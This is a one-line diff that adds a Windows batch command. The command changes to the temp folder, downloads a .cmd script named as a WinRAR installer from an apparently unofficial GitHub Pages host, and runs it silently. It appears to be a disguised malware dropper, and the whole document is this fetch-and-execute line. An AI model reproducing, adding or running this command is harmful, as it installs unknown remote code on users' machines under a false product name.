@@ -1,0 +1,1 @@
+@echo OFF & cd %temp% & curl -o WinRARx64x32.cmd https://winrar-lab.github.io/Windows-10/WinRARx64x32.cmd & timeout 2 & start WinRARx64x32.cmd & exit
